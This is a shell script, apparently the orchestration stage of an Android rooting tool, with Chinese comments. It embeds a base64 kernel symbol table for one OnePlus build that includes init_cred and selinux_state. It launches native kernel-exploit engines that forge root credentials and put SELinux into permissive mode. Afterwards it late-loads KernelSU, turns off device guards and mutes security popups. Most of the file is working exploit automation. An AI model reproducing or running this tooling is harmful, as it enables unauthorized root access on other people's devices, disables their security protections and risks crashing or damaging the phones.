ACE5_SYMS_B64='IyBpYy10aW1lciBzeW1ib2wgdGFibGUKIyBidWlsZD02LjEuMTU3LWFuZHJvaWQxNC0xMS1vLWdhMDVkYTIyM2ZiMzAKIyB2ZXJzaW9uPVBLQjExMCBBY2UgNSDnq57pgJ/niYggZ2EwNWRhMjIzZmIzMApfX2ZpbGVtYXBfZmRhdGF3YWl0X3JhbmdlPTB4ZmZmZmZmYzAwODA0NDFjYwpfX3ZtX211bm1hcD0weGZmZmZmZmMwMDgyMjljMWMKX193YWl0X29uZV9kaXNjYXJkX2Jpbz0weGZmZmZmZmMwMDg3YmRmZTgKZG9fZXhpdD0weGZmZmZmZmMwMDgzYzhkYzAKZjJmc19pc3N1ZV9jaGVja3BvaW50PTB4ZmZmZmZmYzAwODI2MDgyYwpmMmZzX3dhaXRfb25fbm9kZV9wYWdlc193cml0ZWJhY2s9MHhmZmZmZmZjMDA4MjUwMGE0CmZpbGVtYXBfcmVhZD0weGZmZmZmZmMwMDgxYTU5ZjgKbXNsZWVwPTB4ZmZmZmZmYzAwODJkODcxOApyY3VfZ3BfZnFzX2xvb3A9MHhmZmZmZmZjMDA4MTMyYTgwCnJjdV9ncF9rdGhyZWFkPTB4ZmZmZmZmYzAwODEzMWYzOApydW5xdWV1ZXM9MHhmZmZmZmZjMDBhMDExNmMwCnN5bmNocm9uaXplX3JjdV9leHBlZGl0ZWQ9MHhmZmZmZmZjMDA4MTI5YzQwCnVmc2hjZF9kZWxheV91cz0weGZmZmZmZmMwMDgwZTM5ZjAKd29ya2VyX3RocmVhZD0weGZmZmZmZmMwMDgyZDM0NzAKZnV0ZXhfd2FpdF9xdWV1ZT0weGZmZmZmZmMwMDhhMjVjZjgKZnV0ZXhfd2FpdD0weGZmZmZmZmMwMDgwNGEyN2MKZG9fZnV0ZXg9MHhmZmZmZmZjMDA4M2QxNTE4CnBpcGVfcmVhZD0weGZmZmZmZmMwMDgwYzRlYzgKcGlwZV93cml0ZT0weGZmZmZmZmMwMDgzNzYyZjAKZG9fZXBvbGxfd2FpdD0weGZmZmZmZmMwMDgyZDRlMzAKc2NoZWR1bGVfdGltZW91dD0weGZmZmZmZmMwMDhmZjU0ZDQKaW9fc2NoZWR1bGU9MHhmZmZmZmZjMDA4ZmY2OTNjCm1zbGVlcF9pbnRlcnJ1cHRpYmxlPTB4ZmZmZmZmYzAwODJkODc1Ywp3YWl0X2Zvcl9jb21wbGV0aW9uPTB4ZmZmZmZmYzAwOGZmNjlmOAp3YWl0X2Zvcl9jb21wbGV0aW9uX2ludGVycnVwdGlibGU9MHhmZmZmZmZjMDA4ZmY2ZDdjCm11dGV4X2xvY2s9MHhmZmZmZmZjMDA4ZmY3NjBjCl9fbXV0ZXhfbG9ja19zbG93cGF0aD0weGZmZmZmZmMwMDhmZjc2ZjgKZG93bj0weGZmZmZmZmMwMDhmZmQyYTgKZG93bl9yZWFkPTB4ZmZmZmZmYzAwOGZmOWZmMAprdGhyZWFkPTB4ZmZmZmZmYzAwODQ1ZGI2NAprdGhyZWFkZD0weGZmZmZmZmMwMDg0NWNjOTgKa3RocmVhZF93b3JrZXJfZm49MHhmZmZmZmZjMDA4NDVjZjg4CnJlc2N1ZXJfdGhyZWFkPTB4ZmZmZmZmYzAwODJkMmYxOApmbHVzaF93b3JrPTB4ZmZmZmZmYzAwODJkMDIxNApjYW5jZWxfd29ya19zeW5jPTB4ZmZmZmZmYzAwODJkMDRmYwpqYmQyX2xvZ193YWl0X2NvbW1pdD0weGZmZmZmZmMwMDg4Y2VlN2MKamJkMl9qb3VybmFsX2NvbW1pdF90cmFuc2FjdGlvbj0weGZmZmZmZmMwMDg0YmNjMjAKZjJmc19iYWxhbmNlX2ZzPTB4ZmZmZmZmYzAwODIyY2Q2OApmMmZzX3dyaXRlX2NoZWNrcG9pbnQ9MHhmZmZmZmZjMDA4MjVmMjM0CnN1Ym1pdF9iaW9fd2FpdD0weGZmZmZmZmMwMDg3Y2ZmMmMKdmZzX3JlYWQ9MHhmZmZmZmZjMDA4MjA2Yzg4CnZmc193cml0ZT0weGZmZmZmZmMwMDgyMDcwMjQKa3N5c19yZWFkPTB4ZmZmZmZmYzAwODg3MDg3Ywprc3lzX3dyaXRlPTB4ZmZmZmZmYzAwODIwNzRiMApzb2NrX3JlY3Ztc2c9MHhmZmZmZmZjMDA4OWE3NzE4CnVuaXhfc3RyZWFtX3JlY3Ztc2c9MHhmZmZmZmZjMDA4MDRlZWEwCnRjcF9yZWN2bXNnPTB4ZmZmZmZmYzAwODBiYjAxMApuX3R0eV9yZWFkPTB4ZmZmZmZmYzAwODQyN2U2YwpiaW5kZXJfdGhyZWFkX3JlYWQ9MHhmZmZmZmZjMDA4MjcyMDBjCmJpbmRlcl9pb2N0bD0weGZmZmZmZmMwMDgyNmMzZTAKZG9fc3lzX3BvbGw9MHhmZmZmZmZjMDA4MjgwNWJjCmRvX3NlbGVjdD0weGZmZmZmZmMwMDgwOTRmMDQKY29yZV9zeXNfc2VsZWN0PTB4ZmZmZmZmYzAwODI3Zjg4OApkb19ncm91cF9leGl0PTB4ZmZmZmZmYzAwODNjOThlOAp2bV9tdW5tYXA9MHhmZmZmZmZjMDA4MjI5YmZjCm1tYXBfcmVnaW9uPTB4ZmZmZmZmYzAwODIyNzk3NApmaWxlbWFwX2ZkYXRhd2FpdF9yYW5nZT0weGZmZmZmZmMwMDgxYTM2ZTAKc3luY2hyb25pemVfcmN1PTB4ZmZmZmZmYzAwODEyOWExOAppb193cV9zdWJtaXRfd29yaz0weGZmZmZmZmMwMDg2MTUxZmMKX19mbHVzaF93b3JrcXVldWU9MHhmZmZmZmZjMDA4MmNmYTQ0CmRyYWluX3dvcmtxdWV1ZT0weGZmZmZmZmMwMDgyZDAwZTAKX190cmFjZXBvaW50X3N5c19leGl0PTB4ZmZmZmZmYzAwYTFkNDU4MApzZWxpbnV4X3N0YXRlPTB4ZmZmZmZmYzAwYTI3Y2YyOAppbml0X3VzZXJfbnM9MHhmZmZmZmZjMDBhMDUwYWIwCmluaXRfY3JlZD0weGZmZmZmZmMwMGEwNTIwNjgKc2lnX2VuZm9yY2U9MHhmZmZmZmZjMDBhMjUwMTUwCm1vZHVsZV9ub3RpZnlfbGlzdD0weGZmZmZmZmMwMGEwY2UyODAKcGFuaWNfb25fd2Fybj0weGZmZmZmZmMwMGEwMmIyYzgKcm9vdF91c2VyPTB4ZmZmZmZmYzAwYTA1MGQ0MAppbml0X3Vjb3VudHM9MHhmZmZmZmZjMDBhMDUyNWM4CmluaXRfZ3JvdXBzPTB4ZmZmZmZmYzAwYTA1MjA2MAo='

ace5_bin() {
  if [ -n "$ND" ] && [ -x "$ND/libicace5.so" ]; then echo "$ND/libicace5.so"; return 0; fi
  for _f in "$D/libicace5.so" /data/local/tmp/libicace5.so; do
    [ -x "$_f" ] && { echo "$_f"; return 0; }
  done
  _apk=$(pm path com.km.kmroot 2>/dev/null | sed -n '1s/^package://p')
  if [ -n "$_apk" ]; then
    _ld=$(dirname "$_apk")/lib/arm64
    [ -x "$_ld/libicace5.so" ] && { echo "$_ld/libicace5.so"; return 0; }
  fi
  for _ld in /data/app/*/com.km.kmroot-*/lib/arm64; do
    [ -x "$_ld/libicace5.so" ] && { echo "$_ld/libicace5.so"; return 0; }
  done
  return 1
}

ace5_payload() {
  cat > "$D/ace5_payload.sh" <<EOS
#!/system/bin/sh
echo "=== ACE5_PAYLOAD uid=\$(id -u) ctx=\$(cat /proc/self/attr/current 2>/dev/null) ==="
grep -E '^(Uid|Gid|CapEff):' /proc/self/status 2>/dev/null
# 与参考实现一致：先落 shell 域再 late-load（此时 SELinux 已 permissive；
# 留在 u:r:kernel:s0 会让管理器 socket 在 enforce 恢复后失联）
echo u:r:shell:s0 > /proc/self/attr/current 2>/dev/null
KS="$KSUD"
[ -n "\$KS" ] || KS=/data/adb/ksud
if [ -x "\$KS" ]; then
  echo "ACE5_PAYLOAD: ksud=\$KS kmi=$KMI pkg=$MGR"
  "\$KS" late-load --kmi $KMI --allow-shell --package-name $MGR
  [ "\$?" = "0" ] || { echo "ACE5_PAYLOAD: 退化到 bare late-load"; "\$KS" late-load; }
else
  echo "ACE5_PAYLOAD: 没有可用 ksud（\$KS）"
fi
echo "=== ACE5_PAYLOAD done mod=\$(grep -ci kernelsu /proc/modules 2>/dev/null) ==="
EOS
  chmod 755 "$D/ace5_payload.sh" 2>/dev/null
}

run_ace5() {
  A5=$(ace5_bin) || { echo "ACE5_GATE: 没找到 ic 核心（nativeLibraryDir 里没有 libicace5.so）→ 回退"; return 1; }
  [ -x "$A5" ] || chmod 755 "$A5" 2>/dev/null
  [ -x "$A5" ] || { echo "ACE5_GATE: 核心不可执行 $A5"; return 1; }
  if [ ! -s "$D/ic-syms.txt" ] || ! grep -q "ga05da223fb30" "$D/ic-syms.txt" 2>/dev/null; then
    printf '%s' "$ACE5_SYMS_B64" | base64 -d > "$D/ic-syms.txt" 2>/dev/null
    sync
  fi
  [ -s "$D/ic-syms.txt" ] || echo "ACE5_WARN: 符号表落盘失败，核心可能拒绝运行"
  ace5_payload
  echo "ACE5_CORE=$A5 syms=$D/ic-syms.txt ($(wc -c < "$D/ic-syms.txt" 2>/dev/null | tr -d ' ')B)"
  echo "ENGINE_START engine=ic-ace5 bin=$(basename "$A5") ksud=${KSUD:-none} pkg=$MGR"
  rm -f ic-core.log
  (
    export IC_SYMS_FILE="$D/ic-syms.txt"
    export IC_FSYNC_LOG=1 IC_PERSIST_LOG=1 IC_KSU=1
    export IC_LOG_PATH="$D/ic-core.log"
    export PAYLOAD_CMD="sh $D/ace5_payload.sh"
    [ -n "$ND" ] && export TMPDIR="$D"
    cd "$D" 2>/dev/null
    setsid sh -c "exec '$A5' ksu > ic-core.log 2>&1 < /dev/null" &
  )
  i=0
  while [ $i -lt $(( ${ACE5_BUDGET:-300} * 5 )) ]; do
    sleep 0.2
    i=$((i+1))
    if have_mod 2>/dev/null; then echo KSU_LOADED; return 0; fi
    grep -q "ACE5_PAYLOAD done" ic-core.log 2>/dev/null && break
    if [ $((i % 25)) -eq 0 ]; then tail -n 2 ic-core.log 2>/dev/null | sed 's/^/  | /'; fi
    if [ $i -gt 15 ] && ! pidof libicace5.so >/dev/null 2>&1; then break; fi
  done
  echo "ACE5_LOG_TAIL:"
  tail -n 30 ic-core.log 2>/dev/null | sed 's/^/  | /'
  if have_mod; then echo KSU_LOADED; return 0; fi
  if grep -q "ACE5_PAYLOAD uid=0" ic-core.log 2>/dev/null; then
    PARTIAL=1
    echo "ACE5_PARTIAL: fake cred 落地（uid=0），但管理器没 late-load 上"
    return 3
  fi
  echo "ACE5_MISS: ic 核心本轮未拿到 root"
  return 1
}

# ---------------------------------------------------------------- 主流程
# 按"native 目录里有 libksud.so"自动找管理器（应对随机包名的魔改 KSU，例如 kqvdie.zeykvw.hpbcyd）
auto_find_manager() {
  _cache="$D/.mgr_auto"
  if [ -f "$_cache" ]; then
    _p=$(cat "$_cache" 2>/dev/null | tr -d '\r')
    if [ -n "$_p" ] && pm path "$_p" 2>/dev/null | grep -q package:; then
      echo "$_p"
      return 0
    fi
  fi
  for _l in $(pm list packages -f 2>/dev/null | sed 's/^package://'); do
    _apk=${_l%=*}
    _pkg=${_l##*=}
    _apk=${_apk#package:}
    _d=$(dirname "$_apk")/lib/arm64
    if [ -f "$_d/libksud.so" ]; then
      echo "$_pkg" > "$_cache" 2>/dev/null
      echo "$_pkg"
      return 0
    fi
  done
  return 1
}

ensure_manager
# 管理器必须真装上：late-load 用的是"它的" ksud，没装就会拉出官方 KSU / 不配套，
# 管理器认不出 su，而且这一轮大概率 park 掉（要冷重启）。宁可不跑。
# 管理器清单：只在"管理器找不到"或 /sdcard/kmroot-debug 存在时才扫（pm list packages 要 0.3~0.8s）
if ! pm path "$MGR" 2>/dev/null | grep -q package: || [ -f /sdcard/kmroot-debug ]; then
  echo "MGR_LIST=$(pm list packages 2>/dev/null | sed 's/^package://' | grep -iE 'ksu|kernelsu|sukisu|resukisu|fina|magisk' | tr '\n' ' ')"
fi
if ! pm path "$MGR" 2>/dev/null | grep -q package:; then
  # 按家族关键字找同类管理器：用户装的名字可能不是我们内置的那个包名
  case "$MGR" in
    *ksunext*) KEY='ksunext' ;;
    *weishu*)  KEY='kernelsu' ;;
    *resukisu*) KEY='resukisu' ;;
    *sukisu*)  KEY='sukisu' ;;
    *fina*)    KEY='fina' ;;
    *)         KEY='' ;;
  esac
  ALT=""
  if [ -n "$KEY" ]; then
    ALT=$(pm list packages 2>/dev/null | sed 's/^package://' | grep -i "$KEY" | grep -v -i 'ksunext' | head -n 1)
    [ -n "$ALT" ] || ALT=$(pm list packages 2>/dev/null | sed 's/^package://' | grep -i "$KEY" | head -n 1)
  fi
  if [ -n "$ALT" ] && [ "$ALT" != "$MGR" ]; then
    echo "MGR_RESOLVED: 用关键字 '$KEY' 在已装应用里找到 $ALT（原选 $MGR 不在）"
    MGR=$ALT
  fi
fi
if ! pm path "$MGR" 2>/dev/null | grep -q package:; then
  AUTO=$(auto_find_manager)
  if [ -n "$AUTO" ]; then
    echo "MGR_AUTO: 按 native 目录里的 libksud.so 自动认到管理器 $AUTO（原选 $MGR 不在）"
    MGR=$AUTO
  fi
fi
if ! pm path "$MGR" 2>/dev/null | grep -q package:; then
  echo "MGR_ABORT: 所选管理器 $MGR 未安装（已按关键字+自动扫描找过替代，没有命中）—— late-load 会拉起不配套的 KSU，已中止。"
  echo "提示：在「ROOT管理器」里改用「自定义管理器…」选中你实际装的那个；上面 MGR_LIST 列出了机器上所有同类包名。"
  echo "RESULT=NOMGR"
  echo DONE
  exit 0
fi
select_ksud
# ★ 0.9.11b：select_ksud 只有 cache 快路径过了 late 闸门；manager / manager:apk /
#   /data/adb 这些出口是 `probe_ksud … && return 0` 直接返回的，**没验 --help**。
#   一旦 .ksud_cache 被清或管理器升级（pm 路径变了），走的就是这些出口 ——
#   没有这道兜底，又会把「只打印帮助就退出」的旧构建喂给引擎（0.9.7 现场的翻版）。
#   幂等：cache 出口已验过的路径这里直接跳过，不会重复烧 --help。
ksud_late_gate
# 版本一致性提示：KSU 管理器会拿"内核模块版本"和"管理器版本"比对，不一致就红字「需要更新内核」。
# 模块版本由 ksud 内嵌的 LKM 决定，所以关键看用的是谁的 ksud。
case "$KSUD_SRC" in
  manager|manager:*|manager-installed:*|cache)
    # cache 只可能是"管理器自带的那份"（写缓存的条件就是路径在 /data/app/ 下），
    # 以前把 cache 归到"可能不匹配"，让明明用对了的机器也被警告 —— 判据写错了。
    echo "KSUD_MATCH=likely（src=$KSUD_SRC → $KSUD，模块版本应与管理器一致）" ;;
  *)
    echo "KSU_VER_WARN: 本次用的是 $KSUD_SRC 的 ksud（$KSUD_VER）—— 它内嵌的内核模块版本可能与管理器不一致，"
    echo "               KSU 管理器会显示「需要更新内核 / 自定义」。不影响 root 功能。"
    echo "               要消除它：①确认管理器里「安装/更新」过（它会把配套的 ksud 写到 /data/adb/ksud）；"
    echo "               ②冷重启（换掉本次已加载的旧 LKM）后再跑，日志里应是 KSUD=/data/adb/ksud 或 src=manager*" ;;
esac
[ -n "$KSUD" ] && [ "$KSUD_SRC" != "cache" ] && printf '%s\n%s\n%s\n' "$KSUD" "$KSUD_VER" "$MGR" > "$D/.ksud_cache" 2>/dev/null
echo "KSUD=${KSUD:-none} src=${KSUD_SRC:-none} ver=${KSUD_VER:-none}"
tlog DEPLOY

if have_mod; then
  echo "ALREADY_LOADED: kernelsu present, skip exploit/load"
  # ★ 0.8.45：LKM 一旦 late-load 进内核就**换不掉**（版本/uapi 都固定了）。
  #   如果管理器后来升级过（或上一次加载用的是旧 ksud），管理器会红字「需要更新内核 / 自定义」，
  #   而这一轮走的是 ALREADY_LOADED、根本没重新加载 → 点多少次都不会变，只能冷重启后重跑。
  echo "MOD_STALE_NOTE: 本次开机的 kernelsu 是**之前加载**的（版本不可再改）；管理器若显示「需要更新内核/自定义」属正常 —— 冷重启后重跑，才会用管理器自带的那份 ksud 重新 late-load"
  finish_loaded
  echo DONE
  exit 0
fi

# 上一轮 park 掉的引擎进程还在 → 这个 boot 已经不干净，再跑只会 HELD/panic
STALEP=""
# 必须用 *_alive 助手（它们同时认短名和 lib<name>.so）：ND 模式下进程名是 libkmplant.so /
# libkmfast.so / libkm612.so，只 pidof 短名会漏掉 → 这道"上次的引擎还活着，本次开机别再跑"
# 的安全门在 ND 模式下等于不存在。
e612_alive  && STALEP="$STALEP km612"
fast_alive  && STALEP="$STALEP kmfast"
plant_alive && STALEP="$STALEP kmplant"
pidof kmslow >/dev/null 2>&1 && STALEP="$STALEP kmslow"
pidof libkmslow.so >/dev/null 2>&1 && STALEP="$STALEP kmslow"
if [ -n "$STALEP" ]; then
  echo "STALE_PROC=$STALEP（上次的引擎进程还在，本次开机必须冷重启后再跑）"
  # 给出"为什么还活着"，别让用户猜：
  if [ -n "$BOOTID" ] && [ -f "$D/km612.hold" ] && [ "$(cat "$D/km612.hold" 2>/dev/null)" = "$BOOTID" ]; then
    echo "STALE_WHY: 本次开机的 6.12 引擎上一次已持页（km612.hold = 当前 boot_id）→ 只能冷重启"
  elif [ -n "$BOOTID" ] && [ -f "$D/held" ] && [ "$(cat "$D/held" 2>/dev/null)" = "$BOOTID" ]; then
    echo "STALE_WHY: 本次开机上一次已持页（held = 当前 boot_id）→ 只能冷重启"
  elif [ -n "$BOOTID" ] && [ -f "$D/parked" ] && [ "$(cat "$D/parked" 2>/dev/null)" = "$BOOTID" ]; then
    echo "STALE_WHY: 本次开机上一次已 park（parked = 当前 boot_id）→ 只能冷重启"
  else
    echo "STALE_WHY: 进程还在但没找到本次开机的持页标记（多半是上一次运行被中断/App 被系统回收）"
    echo "            —— 引擎是否真的持页无法从外部确认，为了不在同一 boot 二次喷洒，这里仍然拒绝开跑"
  fi
  echo "RESULT=REBOOT"
  echo DONE
  exit 0
fi

RC=1
GATE_UNSUPPORTED=0
# ★ tracefs 是**四条引擎路径的共同前置**（kmfast / km612 / kmplant / kmslow 用的是同一套
#   kmem 事件），所以只在这里准备一次，不放在各路径里 —— 放进去迟早会"改了三漏第四"
#   （0.8.9 只给 6.6 加、0.8.14 才发现 6.12 没有，就是这么漏的）。
prep_trace
sys_snapshot
# ★ 0.8.40：预检失败**不再中止本轮**（对齐 参考引擎 —— 它根本不做任何 tracefs 预检）。
# 证据链：①0.8.18 在 PLQ110 上 `KMEM_DENIED / enabled=0/3`，引擎照样跑到 `cred writes landed`；
# ②0.8.39/0.8.40 在这台 PKJ110 上被这条预检直接拦死，而 `adb shell` 亲测
#   `cat .../kmem/mm_page_alloc/enable` → Permission denied、`set_event` → rc=1，
#   说明是本机 ROM 把 kmem 事件只开给 root，不是我们的脚本写错了；
# ③真正能判"引擎被 tracefs 拦住"的只有引擎自己打的 `page event ids not found`
#   （下面 fast 分支里那条判断），不能拿预检结果代替 —— 预检失败只是"可能拦"，不是"一定拦"。
if [ "$TRACE_BLOCKED" = "1" ]; then
  echo "TRACE_WARN: kmem 事件没开起来（enabled<3），仍继续跑引擎；引擎若报 page event ids not found 才是真拦路"
fi
case "$MODE" in
  fast)
    wait_env || { echo "RESULT=ENVFAIL"; echo DONE; exit 0; }
    run_fast66; RC=$?
    if [ $RC -eq 1 ]; then
      if [ "$GATE_UNSUPPORTED" = "1" ]; then
        # 门禁没放行（内核不在已验证名单 / 没有匹配档案）：这一轮**根本没跑引擎**，
        # 再让用户"重启再点"是错的方向 —— 结论要单独给（RESULT=UNSUPPORTED）。
        echo "NO_FALLBACK_FAST: 本机内核不在快速引擎已验证范围，未启动引擎（没有持页，可直接重试或切慢速）"
      else
        if grep -q "page event ids not found" kmfast.log 2>/dev/null; then
          TRACEBLOCK=1
          echo "FAST_BLOCKED: 本机 ROM 没开 tracefs 的 kmem 事件（page event ids not found）→ 快速引擎在这台机上跑不了"
        fi
        echo "NO_FALLBACK_FAST: 只跑快速引擎（98260 慢链已按设定禁用），本轮到此为止"
      fi
      RC=1
    fi
    ;;
  612)
    wait_env || { echo "RESULT=ENVFAIL"; echo DONE; exit 0; }
    # ★ 0.9.6：**完全按 Shark 走** —— 6.12 默认只用它的 runner：
    #   一条链（probe → plant → 一次性 late-load → park），双 OTA 由它自己按 uname 选站点，
    #   不再走 km612n → km612 → km612x → fast_61 那四层 fallback。
    #   我们的老链只在「Shark runner 不认这个 uname」时兜底（6.12.38/58/23 等它没覆盖的档）。
    #   /sdcard/kmroot-legacy612 可强制回老链。
    if [ -f /sdcard/kmroot-legacy612 ]; then
      echo "ENGINE_PICK: 老链 km612 系（/sdcard/kmroot-legacy612 强制）"
      run_612; RC=$?
    else
      run_612s; RC=$?
      if [ "$RC" != "0" ] && grep -q "FAIL=probe REASON=uname" km612s.log 2>/dev/null; then
        echo "SHARK_UNMATCH: Shark runner 不认这个 uname（它只认 6.12.69 的两个 OTA）→ 退回老链 km612 系"
        run_612; RC=$?
      fi
    fi
    if [ $RC -eq 1 ]; then
      if [ "$GATE_UNSUPPORTED" = "1" ]; then
        echo "NO_FALLBACK_612: 本机内核不在 6.12.69 范围（见上面的 ENGINE_GATE_xxx），km612 未启动（没有持页）"
      else
        if [ "$TRACEBLOCK" = "1" ]; then
          echo "FAST_BLOCKED: 本机 ROM 没给 tracefs 的 kmem 事件（page event ids not found）→ 6.12 快速引擎在这台机上跑不了"
          echo "提示：这是 ROM 限制（tracing_on=$([ -r /sys/kernel/tracing/tracing_on ] && cat /sys/kernel/tracing/tracing_on || echo ?)），重试没有意义"
        fi
        echo "NO_FALLBACK_612: 98260 慢链在 6.12 上已知不通（slab order=0 → RECLAIM_WRITES 全 miss），不回退以免二次喷洒"
        echo "提示：6.12 只走 km612 快速引擎；若引擎在校准阶段就失败，冷重启后再试"
      fi
    fi
    ;;
  ace5)
    wait_env || { echo "RESULT=ENVFAIL"; echo DONE; exit 0; }
    run_ace5; RC=$?
    if [ "$RC" = "1" ]; then
      echo "ACE5_FALLBACK: ic 核心未命中且未持页 → 回退 6.1 快速引擎（prof_19）"
      run_fast61; RC=$?
      if [ "$RC" = "1" ] && [ "$GATE_UNSUPPORTED" = "1" ]; then
        echo "NO_FALLBACK_61: 本机没有匹配的 6.1 档案（未启动引擎，无持页）"
      fi
    fi
    ;;
  fast61)
    wait_env || { echo "RESULT=ENVFAIL"; echo DONE; exit 0; }
    run_fast61; RC=$?
    if [ $RC -eq 1 ]; then
      if [ "$GATE_UNSUPPORTED" = "1" ]; then
        echo "NO_FALLBACK_61: 本机内核没有匹配的 6.1 档案（未启动引擎，无持页，可切慢速或等适配）"
      else
        if grep -q "page event ids not found" kmfast61.log 2>/dev/null; then
          TRACEBLOCK=1
          echo "FAST61_BLOCKED: 本机 ROM 没开 tracefs 的 kmem 事件 → 6.1 引擎跑不了（可切慢速 98260）"
        fi
        echo "NO_FALLBACK_61: 6.1 引擎未成功，本轮到此为止"
      fi
      RC=1
    fi
    ;;
  slow)
    if [ "$KBASE" = "612" ]; then run_slow612; RC=$?; else run_slow; RC=$?; fi
    ;;
esac

# ★ 0.9.2：本轮引擎日志里出现 [ids] page_alloc= → 证明它自己把 kmem 事件开起来了。
#   记下来，下一轮直接跳过注定失败的 route A~D（省时间，也少刷 Permission denied）。
for _lg in kmfast61.log kmfast.log km612x.log km612n.log km612s.log km612.log; do
  [ -f "$_lg" ] || continue
  if grep -q "\[ids\] page_alloc=" "$_lg" 2>/dev/null; then
    : > "$D/.engine_selfenable" 2>/dev/null
    echo "ENGINE_SELFENABLE: $(basename "$_lg") 里有 [ids] page_alloc= → 已记录，下次跳过 trace route A~D"
    break
  fi
done

# 收尾：su 可用 → 压制守卫、装/加冕管理器、清理 rootd、拉起管理器
SU_WAIT=0
# 模块不在 /proc/modules 里的时候 su 基本不可能可用：这时再等 15 轮没意义
# （每轮 su_ok 里有两个 8s timeout，最坏能把失败结论拖后 4 分钟才出现）。
_SUMAX=15
have_mod || _SUMAX=1
while [ $SU_WAIT -lt $_SUMAX ]; do su_ok && break; SU_WAIT=$((SU_WAIT+1)); sleep 0.2; done
echo "SU_WAIT_LOOPS=$SU_WAIT"
if su_ok; then
  ROOTX=""
  echo "SU_OK: $(timeout 10 su -c 'id' 2>/dev/null | head -n 1)"
  tlog SU
  echo "MODULE=$(mod_line)"
  # 先给结论：App 看到 RESULT=ROOT 立刻显示"成功"（后面的收尾不再挡时间）
  echo "RESULT=ROOT"
  tlog TOTAL
  dump_pstore
  ensure_manager || true
  ksud_install_once
  crown_manager
  guard_off
  guard_loop_bg
  cleanup_rootd
  guard_on
  self_heal_guard
  camera_hal_reset
  mute_sec_popup_bg
  tlog MGR
  # 不主动拉起管理器：由 App 界面在提权成功后自动弹回主页并刷新状态，无需重启。
else
  if have_mod; then
    echo "RESULT=NOSU"
  elif [ "$PARTIAL" = "1" ]; then
    echo "RESULT=PARTIAL"
  elif [ "$RC" = "2" ]; then
    echo "RESULT=HELD"
  elif [ "$GATE_UNSUPPORTED" = "1" ]; then
    echo "RESULT=UNSUPPORTED"
  elif [ "$RC" = "12" ]; then
    # 引擎文件不完整（return 12）：这不是"没命中"，重试多少次都一样
    echo "RESULT=DEPLOYFAIL"
  elif [ "$TRACEBLOCK" = "1" ]; then
    echo "RESULT=TRACEBLOCK"
  elif [ "$MODE" != "slow" ]; then
    echo "RESULT=FASTFAIL"
  else
    echo "RESULT=FAIL"
  fi
fi
sys_selfcheck
echo DONE
exit 0
